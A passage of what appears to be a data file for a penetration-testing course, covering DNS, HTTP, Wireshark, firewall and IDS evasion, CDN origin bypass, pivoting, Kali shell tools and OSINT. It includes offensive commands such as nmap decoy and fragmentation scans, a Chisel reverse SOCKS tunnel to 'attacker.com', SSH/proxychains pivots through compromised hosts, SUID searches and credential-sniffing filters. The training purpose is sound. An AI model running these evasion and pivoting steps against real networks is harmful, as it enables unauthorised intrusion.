              "Hacker Implication: NAT prevents direct inbound connections from the Internet to a target machine. That is why attackers use Reverse Shells (where the victim initiates the outbound connection to the attacker's public VPS listener) rather than Bind Shells!",
            ],
          },
        ],
        keyTopics: [
          "Trace the complete DNS recursive resolution path from Root (.) to Authoritative NS",
          "Identify critical DNS records: A, AAAA, CNAME, MX, TXT, NS, PTR, and SOA",
          "Execute and analyze DNS Zone Transfer (AXFR) misconfigurations",
          "Understand the DHCP DORA process and rogue DHCP gateway attacks",
          "Master NAT vs PAT mechanics and why penetration testers rely on Reverse Shells",
        ],
        terminalCommands: [
          "dig A target.com +trace",
          "dig any target.com @8.8.8.8",
          "dig axfr target.com @ns1.target.com",
          "host -t mx target.com",
        ],
        proTips: [
          "Look closely at TXT records during initial recon. Companies frequently leave forgotten verification tokens from Canva, Atlassian, Google, or Mailgun, which confirm the exact cloud SaaS stack the company runs.",
        ],
      },
      {
        id: "l-1-7",
        lessonNumber: "1.7",
        title: "Application Protocols for Hackers: HTTP/1.1, HTTP/2, HTTP/3, TLS & SSH",
        duration: "3 Hours",
        badge: "Web Protocols",
        summary:
          "The language of the web: HTTP request/response structure, CRLF byte separators, headers, methods, status codes, HTTPS & TLS 1.3 cryptographic handshakes, HTTP/2 binary multiplexing, HTTP/3 over QUIC, and Request Smuggling fundamentals.",
        studyNotes: [
          {
            heading: "Anatomy of an HTTP/1.1 Request & Response",
            subheading: "Plaintext text-based protocol that underpins the entire World Wide Web",
            points: [
              "An HTTP Request consists of 3 distinct sections separated by CRLF (`\\r\\n` / bytes `0x0D 0x0A`):",
              "1. Request Line: `[METHOD] [PATH] [HTTP-VERSION]` (e.g. `POST /api/login HTTP/1.1`)",
              "2. Headers: Key-value pairs (`Host: api.target.com`, `Content-Type: application/json`, `Cookie: session=xyz`)",
              "3. Blank Line (`\\r\\n\\r\\n`): Indicates the end of headers.",
              "4. Message Body (Optional): The data payload (JSON, form-urlencoded data, XML, binary files).",
              "HTTP Response Structure: Status Line (`HTTP/1.1 200 OK`), Response Headers (`Set-Cookie`, `Content-Length`), Blank Line, Response Body (HTML, JSON).",
              "HTTP Status Code Classes: 1xx Informational; 2xx Success (200 OK, 201 Created); 3xx Redirection (301 Moved Permanently, 302 Found); 4xx Client Error (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found); 5xx Server Error (500 Internal Server Error, 502 Bad Gateway).",
            ],
            diagramOrCode: `RAW HTTP/1.1 REQUEST (Every newline is \\r\\n)
POST /v1/auth HTTP/1.1[CRLF]
Host: target.com[CRLF]
Content-Type: application/json[CRLF]
Content-Length: 32[CRLF]
[CRLF]
{"user":"admin","pass":"secret"}`
          },
          {
            heading: "HTTPS & The TLS 1.3 Cryptographic Handshake",
            subheading: "How asymmetric and symmetric encryption secure HTTP traffic",
            points: [
              "Plaintext HTTP transmits data in the clear — anyone on the Wi-Fi or ISP path can read passwords via Wireshark. HTTPS wraps HTTP inside a TLS (Transport Layer Security) encrypted tunnel.",
              "Hybrid Cryptography: Asymmetric encryption (RSA or Elliptic Curve Diffie-Hellman Ephemeral - ECDHE) is slow, so it is used ONLY during the handshake to authenticate the server and securely agree on a shared secret key. Once agreed, fast Symmetric encryption (AES-256-GCM or ChaCha20-Poly1305) encrypts all data.",
              "TLS Certificates: Issued by trusted Certificate Authorities (CAs). Verifies domain ownership and prevents Man-in-the-Middle attacks.",
              "SNI (Server Name Indication): Transmits the target hostname during the initial TLS Client Hello before encryption starts, allowing virtual hosting on single IP addresses.",
            ],
          },
          {
            heading: "HTTP/2, HTTP/3 & Modern Request Smuggling Foundations",
            subheading: "Binary framing, multiplexing, and frontend-backend desynchronization",
            points: [
              "HTTP/2: Replaces plaintext text with a binary framing layer. Allows multiplexing — multiple concurrent requests and responses stream over a single TCP connection, eliminating head-of-line blocking.",
              "HTTP/3: Built on QUIC (Quick UDP Internet Connections) running over UDP instead of TCP, dramatically cutting handshake round-trips (0-RTT reconnects).",
              "HTTP Request Smuggling Foundation: Occurs when a frontend reverse proxy (like Cloudflare, Nginx, or HAProxy) and a backend web server disagree on where an HTTP request ends — specifically due to discrepancies between `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE) headers. Allows an attacker to poison the web cache, steal other users' sessions, or bypass security controls!",
            ],
            callout: "Discrepancy attacks (like HTTP Request Smuggling) exist entirely because RFC specifications are interpreted slightly differently by different web server implementations. Mastering the raw byte structure of HTTP gives you superpower capabilities in web penetration testing.",
          },
        ],
        keyTopics: [
          "Anatomy of HTTP/1.1 request lines, headers, CRLF separators, and message bodies",
          "Master HTTP methods (GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD)",
          "Interpret HTTP status code classes (2xx, 3xx, 4xx, 5xx)",
          "Analyze HTTPS TLS 1.3 hybrid asymmetric/symmetric key exchange and SNI",
          "Understand HTTP/2 multiplexing and the root cause of HTTP Request Smuggling",
        ],
        terminalCommands: [
          "curl -I -s -v https://example.com",
          "curl --http2 -I https://example.com",
          "printf 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n' | nc example.com 80",
        ],
        proTips: [
          "In Burp Suite Repeater, always toggle 'Show non-printable characters' to inspect exact carriage return and line feed (`\\r\\n`) byte endings; hidden whitespace in headers is the #1 trigger for request smuggling vulnerabilities.",
        ],
      },
      {
        id: "l-1-8",
        lessonNumber: "1.8",
        title: "Packet Sniffing & Traffic Forensics: Wireshark & tcpdump Masterclass",
        duration: "3 Hours",
        badge: "Traffic Analysis",
        summary:
          "Network traffic inspection mastery: Promiscuous mode, PCAP file formats, Wireshark 3-pane interface, building precision display filters, following TCP streams, extracting cleartext credentials, file carving, decrypting HTTPS, and CLI sniffing with tcpdump.",
        studyNotes: [
          {
            heading: "Packet Capture Fundamentals & Promiscuous Mode",
            subheading: "How network cards capture frames not originally destined for them",
            points: [
              "Under normal operating conditions, a computer's Network Interface Card (NIC) inspects the destination MAC address of incoming Ethernet frames. If the MAC does not match its own (or broadcast), the hardware drops the frame immediately.",
              "Promiscuous Mode: Tells the NIC driver to pass every single packet seen on the wire directly up to the operating system kernel, regardless of the destination MAC address.",
              "PCAP / PCAPNG: The industry-standard binary file format used to record raw network traffic packets for forensic analysis and security auditing.",
            ],
          },
          {
            heading: "Wireshark Architecture & Powerful Display Filters for Hackers",
            subheading: "Filtering millions of packets down to the exact vulnerability in seconds",
            points: [
              "The Three Wireshark Panes:",
              "1. Top Pane (Packet List): Chronological summary of every captured packet (Time, Source IP, Destination IP, Protocol, Length, Info).",
              "2. Middle Pane (Packet Details): Complete OSI layer breakdown; expandable trees for Ethernet, IP, TCP/UDP, and Application payloads.",
              "3. Bottom Pane (Packet Bytes): Raw hexadecimal and ASCII representation of the packet payload.",
              "Capture Filters vs. Display Filters: Capture filters (BPF syntax, e.g. `host 192.168.1.1 and port 80`) dictate what the kernel saves. Display filters (Wireshark syntax) filter the viewed packets in real time.",
              "Essential Display Filters for Hackers:",
              "`ip.addr == 192.168.1.50` -> Filters all traffic involving this host",
              "`tcp.port == 80 || tcp.port == 443` -> Web traffic only",
              "`http.request.method == \"POST\"` -> Submissions with logins or form data",
              "`frame contains \"password\" || frame contains \"token\"` -> Cleartext credential search",
              "`tcp.flags.syn == 1 && tcp.flags.ack == 0` -> Identify inbound port scans",
              "`dns.flags.response == 1 && dns.flags.rcode != 0` -> Find failed DNS lookups",
            ],
            diagramOrCode: `WIRESHARK 3-PANE ARCHITECTURE
+-------------------------------------------------------------+
| No. | Time   | Source        | Destination   | Protocol | Info
| 1   | 0.000  | 192.168.1.10  | 192.168.1.1   | TCP      | 443 > SYN
+-------------------------------------------------------------+
> Frame 1: 74 bytes on wire
> Ethernet II, Src: 00:11:22:33:44:55, Dst: 00:aa:bb:cc:dd:ee
> Internet Protocol Version 4, Src: 192.168.1.10, Dst: 192.168.1.1
> Transmission Control Protocol, Src Port: 54321, Dst Port: 443
+-------------------------------------------------------------+
0000  00 aa bb cc dd ee 00 11  22 33 44 55 08 00 45 00
0010  00 3c 1a 2b 40 00 40 06  ...`
          },
          {
            heading: "Following TCP Streams & Decrypting HTTPS Traffic",
            subheading: "Reconstructing entire conversations and stripping modern encryption",
            points: [
              "Following TCP Streams: Right-click any TCP packet -> 'Follow' -> 'TCP Stream'. Wireshark reassembles all fragmented segments and renders the complete human-readable client request (red) and server response (blue).",
              "File Carving / Exporting Objects: In Wireshark, navigate to `File -> Export Objects -> HTTP`. You can save downloaded images, PDFs, Word docs, and executables directly from network captures.",
              "Decrypting HTTPS with `SSLKEYLOGFILE`: Browsers (Chrome, Firefox) can be instructed to write their symmetric session keys to a file: `export SSLKEYLOGFILE=~/sslkeys.log`. In Wireshark, navigate to `Edit -> Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename`. Wireshark instantly decrypts all your TLS traffic in real time!",
            ],
          },
          {
            heading: "Command-Line Sniffing with tcpdump and tshark",
            subheading: "Capturing packets on remote headless Linux servers where GUI is unavailable",
            points: [
              "`tcpdump -i eth0 -n`: Sniffs traffic without resolving DNS (faster, leaves no reverse DNS footprint).",
              "`tcpdump -i eth0 -w capture.pcap`: Writes live traffic to a file for later Wireshark analysis.",
              "`tcpdump -i eth0 -A 'port 80'`: Dumps HTTP packet payloads directly in ASCII text to the terminal.",
              "`tshark`: Wireshark's command-line sibling; supports full Wireshark display filter syntax directly in bash scripts.",
            ],
          },
        ],
        keyTopics: [
          "Understand Promiscuous Mode mechanics on Network Interface Cards",
          "Navigate the 3-pane architecture of Wireshark (Packet List, Details, Bytes)",
          "Write advanced display filters for credentials, HTTP POSTs, and SYN scans",
          "Reassemble multi-packet conversations using 'Follow TCP Stream'",
          "Decrypt live HTTPS traffic using SSLKEYLOGFILE session master keys",
          "Execute headless packet captures using tcpdump and tshark CLI one-liners",
        ],
        terminalCommands: [
          "sudo tcpdump -i eth0 -n -c 20",
          "sudo tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12:1]&0xf0)>>2)) != 0)'",
          "tshark -i eth0 -Y 'http.request.method == \"POST\"' -T fields -e ip.src -e http.host -e http.request.uri",
          "export SSLKEYLOGFILE=~/sslkeys.log",
        ],
        proTips: [
          "When auditing an API or Android mobile app that uses SSL pinning, pairing an Android emulator with `SSLKEYLOGFILE` or Frida hooks allows you to inspect traffic in Wireshark even when traditional proxy tools like Burp Suite get rejected by certificate checks.",
        ],
      },
      {
        id: "l-1-9",
        lessonNumber: "1.9",
        title: "Advanced Network Defense, Firewalls, Evasion, Proxies & Pivoting",
        duration: "3 Hours",
        badge: "Advanced Network Pentest",
        summary:
          "Mastering enterprise network architecture and evasion: Stateful firewalls, Web Application Firewalls (WAFs), IDS/IPS evasion (packet fragmentation, decoy scanning), finding real origin IPs behind Cloudflare/CDNs, VLAN hopping, and lateral movement pivoting via SSH tunnels and Chisel.",
        studyNotes: [
          {
            heading: "Firewall Architecture & Inspection Types",
            subheading: "Packet-Filtering vs. Stateful vs. Next-Generation Firewalls vs. WAFs",
            points: [
              "Packet-Filtering Firewall (Stateless): Evaluates each packet in isolation against static rules (Source IP, Destination IP, Port). Has zero memory of previous packets.",
              "Stateful Inspection Firewall: Maintains a dynamic state table of active TCP and UDP connections. When an internal client initiates an outbound connection, the firewall automatically permits the returning traffic without needing a permanent inbound opening.",
              "Next-Generation Firewall (NGFW): Operates up to Layer 7. Performs Deep Packet Inspection (DPI) to identify application signatures regardless of what port they run on (e.g. detects BitTorrent running over port 443).",
              "Web Application Firewall (WAF): Dedicated Layer 7 filter (Cloudflare, AWS WAF, ModSecurity) designed specifically to inspect HTTP payloads for SQL injection, XSS, directory traversal, and command injection attacks.",
            ],
          },
          {
            heading: "Firewall & IDS/IPS Evasion Techniques for Penetration Testers",
            subheading: "How offensive engineers slip past automated security controls",
            points: [
              "Packet Fragmentation (`nmap -f`): Splits 20-byte IP headers and payloads across multiple tiny 8-byte fragments. Simple packet filters that inspect whole headers fail to assemble the puzzle before routing.",
              "Decoy Scanning (`nmap -D RND:10`): Injects 10 spoofed, random IP addresses into the scanning traffic alongside your real IP. The target firewall logs 11 simultaneous scans, making it nearly impossible for blue team analysts to tell which one is real.",
              "Source Port Manipulation (`nmap --source-port 53`): Many legacy firewalls blindly trust inbound traffic originating from UDP/TCP port 53 (DNS) or port 88 (Kerberos). Spoofing your source port to 53 can bypass restrictive ingress filters.",
              "Data Padding & MTU Manipulation: Altering the Maximum Transmission Unit (`--mtu 16`) or appending arbitrary payload bytes (`--data-length 25`) evades signature-based IDS engines.",
            ],
          },
          {
            heading: "Reverse Proxies, CDNs & Finding Real Origin IPs",
            subheading: "Bypassing Cloudflare, Akamai, and Fastly to strike vulnerable backend servers",
            points: [
              "Content Delivery Networks (CDNs) and Reverse Proxies sit in front of web servers. When an attacker attacks `example.com`, they are actually attacking Cloudflare's edge cache, which blocks malicious payloads.",
              "If the attacker discovers the Real Origin IP of the backend server (the actual Linux machine behind Cloudflare), they can bypass the WAF entirely and attack the origin server directly!",
              "Techniques to Find Real Origin IPs:",
              "1. Historical DNS Records: Check historical DNS databases (SecurityTrails, ViewDNS, DNSDumpster). Often, companies ran their servers on the origin IP for years before turning on Cloudflare.",
              "2. SSL Certificate Search: Search Censys.io or Shodan.io for the target's SSL certificate SHA-256 fingerprint. Shodan scans the entire IPv4 Internet; if an origin server presents the SSL certificate on port 443, Shodan has logged its real IP.",
              "3. Email Header Analysis: Trigger an automated email from the application (e.g. 'Forgot Password'). Inspect the `Received: from` header in the raw email headers; it often reveals the internal origin IP.",
            ],
            callout: "Bypassing a CDN by finding the origin IP is one of the most celebrated skills in bug bounty hunting. A vulnerability that gets blocked with a '403 WAF Blocked' on the main domain can often be executed immediately on the direct origin IP!",
          },
          {
            heading: "Network Segmentation, VLANs & VLAN Hopping",
            subheading: "Breaking out of isolated corporate networks",
            points: [
              "Network Segmentation isolates sensitive networks (e.g. Payment Processing PCI-DSS zone) from general employee workstations.",
              "DMZ (Demilitarized Zone): A perimeter subnet between the public Internet and the private internal network. Houses public servers (web, mail, DNS). If a web server is hacked, firewall rules prevent it from accessing the internal database zone.",
              "VLANs (Virtual LANs - IEEE 802.1Q): Logically separate different subnets on the exact same physical switch hardware using 4-byte 802.1Q tags.",
              "VLAN Hopping Attacks:",
              "1. Switch Spoofing: An attacker's machine pretends to be another Cisco switch using Dynamic Trunking Protocol (DTP), creating an 802.1Q trunk link to receive traffic from ALL VLANs.",
              "2. Double Tagging: Prepending two VLAN tags to an Ethernet frame. The first switch strips the outer tag, and the second switch forwards the frame to the victim VLAN. (Unidirectional attack).",
            ],
          },
          {
            heading: "Network Pivoting, Tunneling & Port Forwarding (SSH & Chisel)",
            subheading: "How to use a compromised machine as a springboard into internal networks",
            points: [
              "When you compromise a machine (Host A) that has two network cards — one facing the Internet (192.168.1.10) and one facing an internal private network (10.10.10.5) — you cannot directly reach the internal network from your Kali Linux machine. You must Pivot.",
              "Local Port Forwarding (`ssh -L`): Forwards a port from your local machine to a remote internal server through the pivot host: `ssh -L 8080:10.10.10.20:80 user@192.168.1.10`. Visiting `http://localhost:8080` loads the internal server!",
              "Dynamic Port Forwarding (`ssh -D`): Creates a local SOCKS5 proxy: `ssh -D 1080 user@192.168.1.10`. By configuring `proxychains` in Kali Linux (`/etc/proxychains4.conf`), you can run ANY tool through the pivot: `proxychains nmap -sT 10.10.10.0/24`.",
              "Chisel: A fast, modern TCP/UDP tunnel written in Go that tunnels traffic over HTTP/WebSockets, bypassing restrictive corporate firewalls that block standard SSH ports.",
            ],
            diagramOrCode: `PIVOTING THROUGH A DUAL-HOMED HOST
[ Attacker Kali ]
       | (Public Internet / Allowed SSH)
       v
[ Compromised Web Server (Pivot) ]
       | NIC 1: 192.168.1.10 (Public)
       | NIC 2: 10.10.10.5   (Internal LAN)
       v
[ Hidden Internal Domain Controller / Database (10.10.10.100) ]
(Completely Inaccessible from the Internet Directly)`
          },
        ],
        keyTopics: [
          "Understand differences between Stateless, Stateful, Next-Gen (NGFW), and Web Application (WAF) firewalls",
          "Apply IDS/IPS evasion: Packet fragmentation (-f), Decoy scanning (-D), and Source port spoofing (--source-port 53)",
          "Discover real origin IPs behind Cloudflare/Akamai using historical DNS and SSL certificate fingerprinting",
          "Analyze DMZ architectures, VLAN 802.1Q tagging, and VLAN Hopping mechanics",
          "Master network pivoting with SSH Local, Remote, and Dynamic SOCKS5 tunneling and Chisel",
        ],
        terminalCommands: [
          "sudo nmap -sS -f --mtu 16 -D RND:5 -p 80,443 target.com",
          "ssh -D 1080 -N -f user@pivot-host.com",
          "proxychains nmap -sT -Pn -p 22,80,443 10.10.10.0/24",
          "./chisel client attacker.com:8000 R:socks",
        ],
        proTips: [
          "When pivoting into an internal enterprise network through a Linux pivot host, always disable DNS lookups in proxychains (`/etc/proxychains4.conf` -> comment out `proxy_dns`) if internal DNS servers are unroutable, or specify the internal DNS server directly to avoid massive timeout delays.",
        ],
      },
    ],
    handsOnLab: {
      title: "Lab 1: Comprehensive Network Forensics, Reconnaissance & Traffic Decryption",
      target: "Vulnerable Network Simulation Environment & Live Wireshark Capture",
      goal: "Start from zero network enumeration, calculate subnets, execute DNS zone transfers, analyze raw HTTP headers, reconstruct credentials from Wireshark PCAPs, and configure an SSH SOCKS5 pivot tunnel.",
      steps: [
        "1. Map your local network interface, MAC address, and subnet mask using `ip addr show` and `ipcalc`.",
        "2. Query authoritative nameservers for the target domain and test for unauthenticated DNS Zone Transfer (AXFR) using `dig axfr`.",
        "3. Launch Wireshark in promiscuous mode on your primary network interface with display filter `http.request || dns`.",
        "4. Trigger an authentication request to a test application, locate the packet in the Wireshark list, and follow the TCP Stream to extract the raw HTTP payload.",
        "5. Re-run an Nmap scan using decoy IPs (`-D RND:5`) and inspect the resulting capture in Wireshark to verify that multiple source IPs are logged.",
        "6. Establish an SSH dynamic SOCKS5 proxy tunnel (`ssh -D 1080`) and route command-line tools through `proxychains` to access an internal target.",
      ],
      verification: "Verify that all internal subdomains are extracted via AXFR, cleartext credentials are recovered from the PCAP stream, and internal hosts are reachable through the SOCKS5 proxy tunnel.",
    },
    checklist: [
      { id: "ch1-t1", label: "Mastered 'What is a Computer Network?': Hosts, Media, Bandwidth, and PAN/LAN/MAN/WAN" },
      { id: "ch1-t2", label: "Understood Topologies (Star, Mesh, Bus) and hardware (Hubs, Switches, Routers, Firewalls)" },
      { id: "ch1-t3", label: "Analyzed Collision Domains vs Broadcast Domains and how switches eliminate collisions" },
      { id: "ch1-t4", label: "Mastered the 5-step Encapsulation / Decapsulation lifecycle (Data -> Segment -> Packet -> Frame -> Bits)" },
      { id: "ch1-t5", label: "Understood MAC addressing, IEEE OUI vendor prefixes, and ARP Cache Poisoning (MITM)" },
      { id: "ch1-t6", label: "Mastered all 7 layers of the OSI model and their specific offensive attack surfaces" },
      { id: "ch1-t7", label: "Calculated IPv4 subnet masks, CIDR notations (/24, /28, /30), and memorized RFC 1918 private ranges" },
      { id: "ch1-t8", label: "Analyzed cloud metadata link-local IP 169.254.169.254 and its role in SSRF vulnerabilities" },
      { id: "ch1-t9", label: "Dissected TCP 3-Way Handshake (SYN, SYN-ACK, ACK), teardown, and all 6 TCP flags" },
      { id: "ch1-t10", label: "Mastered Nmap port scanning mechanics: SYN Stealth (-sS), Connect (-sT), and UDP (-sU)" },
      { id: "ch1-t11", label: "Traced the complete DNS resolution chain and exploited DNS Zone Transfers (AXFR)" },
      { id: "ch1-t12", label: "Understood DHCP DORA allocation, starvation attacks, and NAT/PAT port forwarding" },
      { id: "ch1-t13", label: "Dissected raw HTTP/1.1 request/response structures, CRLF separators, and TLS 1.3 handshakes" },
      { id: "ch1-t14", label: "Captured and analyzed live network traffic in Wireshark and reconstructed TCP streams" },
      { id: "ch1-t15", label: "Decrypted live HTTPS traffic using SSLKEYLOGFILE session master keys in Wireshark" },
      { id: "ch1-t16", label: "Executed IDS/IPS firewall evasion using packet fragmentation (-f) and decoy scans (-D)" },
      { id: "ch1-t17", label: "Discovered real origin IPs behind Cloudflare/CDNs using historical DNS and SSL fingerprints" },
      { id: "ch1-t18", label: "Configured SSH dynamic SOCKS5 proxies and pivoted through dual-homed hosts with Proxychains" },
    ],
  },
  {
    id: "ch-2-kali",
    chapterNumber: 2,
    title: "Kali Linux Architecture & Offensive Command Line",
    subtitle: "Terminal Power Tools, Text Processing, Process Isolation, SSH Tunnels & Bash Automation",
    badge: "Chapter 2 • OS Mastery",
    duration: "16 Hours • 6 Lessons",
    difficulty: "Beginner",
    description:
      "A hacker without mastery over the Linux shell is like a surgeon without surgical instruments. Master text-manipulation pipelines, background processes, SUID permissions, SSH tunneling, and building automated recon scripts.",
    iconName: "Terminal",
    lessons: [
      {
        id: "l-2-1",
        lessonNumber: "2.1",
        title: "Kali Linux Filesystem Hierarchy & Core Utilities",
        duration: "2.5 Hours",
        badge: "Linux Internals",
        summary:
          "Understanding `/etc`, `/var/log`, `/opt`, `/usr/share/wordlists`, package managers (apt, git), and environment variables.",
        keyTopics: [
          "Linux Directory Structure: `/etc/passwd`, `/etc/shadow`, `/var/log/auth.log`, `/tmp`, `/dev/shm`",
          "SecLists installation path: `/usr/share/seclists/` & wordlists management",
          "Configuring PATH variables, aliases, and persistent zsh/bash profiles",
        ],
        terminalCommands: [
          "sudo apt update && sudo apt install -y seclists curl jq ripgrep",
          "echo 'export PATH=$PATH:~/go/bin' >> ~/.zshrc && source ~/.zshrc",
          "ls -la /usr/share/wordlists/",
        ],
        proTips: [
          "Always install Go-based tools (`subfinder`, `httpx`, `nuclei`) into `~/go/bin` and add it to your PATH.",
        ],
      },
      {
        id: "l-2-2",
        lessonNumber: "2.2",
        title: "Text Processing Supremacy: grep, awk, sed, cut, sort & uniq",
        duration: "3 Hours",
        badge: "Data Pipelines",
        summary:
          "Turning messy recon outputs containing 50,000 URLs into clean, deduplicated, targetable scope files in seconds.",
        keyTopics: [
          "grep & ripgrep: Regex matching, inverse matching (-v), extract only matching patterns (-o)",
          "awk: Column manipulation, conditional printing, filtering by HTTP status codes",
          "sed: Stream editor for search and replace, removing protocols `http://` or trailing slashes",
          "sort -u & anew: Deduplication without losing stream speed",
        ],
        terminalCommands: [
          "cat urls.txt | grep -E '\\.php|\\.aspx' | sort -u > endpoints.txt",
          "cat targets.txt | awk '{print $1}' | cut -d':' -f1 | sort -u",
          "cat subdomains.txt | sed 's|^https\\?://||' | anew clean_subs.txt",
        ],
        proTips: [
          "Install `anew` by tomnomnom: `cat new_data.txt | anew master_list.txt` automatically appends only unique entries.",
        ],
      },
      {
        id: "l-2-3",
        lessonNumber: "2.3",
        title: "Permissions, SUID/SGID & Privilege Escalation Foundations",
        duration: "2.5 Hours",
        badge: "PrivEsc",
        summary:
          "Understanding octal permissions (755, 644), special bits (SUID 4000, SGID 2000, Sticky bit 1000), and GTFOBins.",
        keyTopics: [
          "Standard permissions: Read (4), Write (2), Execute (1) across User, Group, Others",
          "SUID bit vulnerability: Binaries executing with root permissions when invoked by low-privilege users",
          "GTFOBins: Exploiting legitimate system binaries (`find`, `vim`, `bash`, `python`) to spawn root shells",
        ],
        terminalCommands: [
          "find / -perm -4000 -type f 2>/dev/null",
          "sudo -l",
          "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        ],
        proTips: [
          "Bookmark `gtfobins.github.io` — it provides instant copy-paste commands for bypassing local shell restrictions.",
        ],
      },
      {
        id: "l-2-4",
        lessonNumber: "2.4",
        title: "SSH Keys, Local/Remote Port Forwarding & SOCKS Proxies",
        duration: "3 Hours",
        badge: "Tunneling",
        summary:
          "Pivoting into internal networks behind firewalls using SSH Dynamic Port Forwarding (-D) and Proxychains.",
        keyTopics: [
          "SSH Key Generation & Hardening: `ssh-keygen -t ed25519`",
          "Dynamic SOCKS5 Proxy (-D): Tunneling any browser or tool through a remote compromised bastion server",
          "Local Port Forwarding (-L): Accessing internal MySQL/Redis services listening only on 127.0.0.1",
          "Proxychains Configuration: Routing Nmap, cURL, and Burp through multi-hop proxy chains",
        ],
        terminalCommands: [
          "ssh -D 9050 -C -q -N user@remote-vps.com",
          "ssh -L 8080:127.0.0.1:3306 user@remote-vps.com",
          "proxychains nmap -sT -Pn 10.10.10.5",
        ],
        proTips: [
          "When running tools over Proxychains, always use TCP Connect scan (`nmap -sT`), because SYN stealth scans cannot traverse TCP proxies.",
        ],
      },
      {
        id: "l-2-5",
        lessonNumber: "2.5",
        title: "Background Jobs, Screen, Tmux & Process Monitoring",
        duration: "2 Hours",
        badge: "Productivity",
        summary:
          "Running 24-hour long fuzzing and mass-scanning jobs without disconnecting when SSH sessions drop.",
        keyTopics: [
          "Managing background jobs: `&`, `ctrl+z`, `bg`, `fg`, `jobs`, `nohup`",
          "Tmux Mastery: Creating persistent sessions, split panes, detaching (`ctrl+b d`), and reattaching (`tmux attach`)",
          "Monitoring resource exhaustion: `htop`, `ps aux --sort=-%mem`, killing rogue processes",
        ],
        terminalCommands: [
          "tmux new -s bugbounty",
          "nohup subfinder -d target.com -o subs.txt > /dev/null 2>&1 &",
          "tmux attach-session -t bugbounty",
        ],
        proTips: [
          "Always run recon in `tmux` on a remote VPS; never run multi-hour brute force jobs on your local laptop screen.",
        ],
      },
      {
        id: "l-2-6",
        lessonNumber: "2.6",
        title: "Building Automated Offensive Recon Bash Scripts",
        duration: "3 Hours",
        badge: "Automation",
        summary:
          "Creating a modular, error-handled shell script that orchestrates subfinder, httpx, nuclei, and alerts via Discord/Telegram webhooks.",
        keyTopics: [
          "Shell script structure: `set -euo pipefail` for strict error handling",
          "Parsing CLI arguments using `getopts`",
          "Streaming outputs between tools via Linux Unix pipelines without creating giant intermediate files",
          "Sending real-time Slack/Discord/Telegram webhook notifications when critical findings trigger",
        ],
        terminalCommands: [
          "chmod +x auto_recon.sh",
          "./auto_recon.sh -d target.com",
          "curl -H \"Content-Type: application/json\" -X POST -d '{\"content\":\"New Subdomain Found!\"}' $WEBHOOK_URL",
        ],
        proTips: [
          "Use `set -e` in all your bash scripts so execution halts immediately if a critical prerequisite fails.",
        ],
      },
    ],
    handsOnLab: {
      title: "Lab 2: Build a Continuous Subdomain Monitor in Bash",
      target: "Self-hosted VPS & Target Bounty Scope",
      goal: "Write an automated script that scans a target domain hourly, checks for new live HTTP services, and alerts your phone via Telegram.",
      steps: [
        "1. Write a bash script invoking `subfinder` piped to `anew subs_archive.txt`.",
        "2. Run `httpx -status-code -title` on any newly discovered subdomains.",
        "3. If new entries exist, send a POST request with the diff to a Discord/Telegram Webhook.",
        "4. Schedule the script in Linux cron using `crontab -e` to execute every 60 minutes.",
      ],
      verification: "Simulate adding a new subdomain and verify receiving an instant push notification on your phone.",
    },
    checklist: [
      { id: "ch2-t1", label: "Installed SecLists and configured Go binary tools directory in PATH" },
      { id: "ch2-t2", label: "Mastered grep, awk, sed, and cut for rapid scope filtering" },
      { id: "ch2-t3", label: "Understood SUID/SGID special permissions and checked GTFOBins" },
      { id: "ch2-t4", label: "Configured SSH Dynamic SOCKS5 Proxy (-D 9050) and Proxychains" },
      { id: "ch2-t5", label: "Created and managed detached Tmux sessions for continuous scanning" },
      { id: "ch2-t6", label: "Written a modular bash recon pipeline with error handling" },
      { id: "ch2-t7", label: "Integrated Discord/Telegram Webhook alerts in Linux scripts" },
      { id: "ch2-t8", label: "Configured Linux cron jobs for scheduled automated recon" },
    ],
  },
  {
    id: "ch-3-osint",
    chapterNumber: 3,
    title: "OSINT & Passive Reconnaissance Masterclass",
    subtitle: "Domain Intelligence, Certificate Transparency, GitHub Leaks & Shodan IoT Hunting",
    badge: "Chapter 3 • Passive Recon",
    duration: "16 Hours • 6 Lessons",
    difficulty: "Intermediate",
    description:
      "80% of critical bugs are discovered before sending a single offensive packet to the target. Learn passive reconnaissance: finding hidden staging environments, exposed API keys, and internal servers using public intelligence feeds.",
    iconName: "Search",
    lessons: [
      {
        id: "l-3-1",
        lessonNumber: "3.1",
        title: "Domain Intelligence, ASN Scoping & Reverse IP",
        duration: "2.5 Hours",
        badge: "Scoping",
        summary:
          "Finding an enterprise's entire IP range via Autonomous System Numbers (ASN), WHOIS records, and reverse IP lookups.",
        keyTopics: [
          "ASN Discovery: Identifying company IP allocations (e.g. AS15169 for Google) using BGPview & Hurricane Electric",
          "Reverse WHOIS: Finding associated domains registered under the same corporate email or registrant name",
          "Acquisition & Merger Mapping: Researching Crunchbase and SEC 10-K filings to expand bounty scope legally",
        ],
        terminalCommands: [
          "whois -h whois.radb.net -- '-i origin AS15169'",
          "amass intel -org 'Target Organization'",
          "amass intel -asn 12345",
        ],
        proTips: [
          "Always check bug bounty policy scope; if ASN or wildcards `*.target.com` are in scope, you have thousands of untapped assets.",
        ],
      },
      {
        id: "l-3-2",
        lessonNumber: "3.2",
        title: "Certificate Transparency (CT) Logs Mining",
        duration: "2.5 Hours",
        badge: "Passive Recon",
        summary:
          "Leveraging public SSL/TLS Certificate Transparency logs to find newly created subdomains minutes after generation.",
        keyTopics: [
          "How Certificate Transparency works: Every public TLS certificate issued by Let's Encrypt, DigiCert, etc., is permanently logged",
          "Querying crt.sh & C99 for subdomains and SAN (Subject Alternative Names)",
          "Real-time CT log streaming with `certstream` to catch new staging domains before firewalls protect them",
        ],
        terminalCommands: [
          "curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u",
          "subfinder -d target.com -all -silent | anew subs.txt",
        ],
        proTips: [
          "Newly registered certificates containing words like `dev-`, `staging-`, `jira-`, `vpn-` usually have minimal security controls!",
        ],
      },
      {
        id: "l-3-3",
        lessonNumber: "3.3",
        title: "Google Dorking for High-Severity Bug Bounties",
        duration: "3 Hours",
        badge: "Dorking",
        summary:
